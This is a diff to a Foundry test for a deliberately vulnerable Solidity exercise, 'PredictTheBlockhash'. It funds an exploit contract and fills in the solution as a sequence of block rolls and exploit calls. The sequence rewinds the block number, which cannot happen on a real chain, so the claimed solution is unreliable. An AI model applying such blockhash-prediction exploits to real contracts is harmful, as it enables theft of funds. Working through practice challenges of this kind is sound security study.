@@ -13,7 +13,7 @@ contract PredictTheBlockhashTest is Test {
     function setUp() public {
         // Deploy contracts
         predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
-        exploitContract = new ExploitContract(predictTheBlockhash);
+        exploitContract = (new ExploitContract){value: 1 ether}(predictTheBlockhash);
     }
 
     function testExploit() public {
@@ -21,8 +21,12 @@ contract PredictTheBlockhashTest is Test {
         uint256 blockNumber = block.number;
         // To roll forward, add the number of blocks to blockNumber,
         // Eg. roll forward 10 blocks: blockNumber + 10
-        vm.roll(blockNumber + 10);
-
+        vm.roll(blockNumber + 2);
+        exploitContract.saveFutureHash();
+        vm.roll(blockNumber);
+        exploitContract.lockInGuess();
+        vm.roll(blockNumber + 2);
+        exploitContract.settle();
         // Put your solution here
 
         _checkSolved();
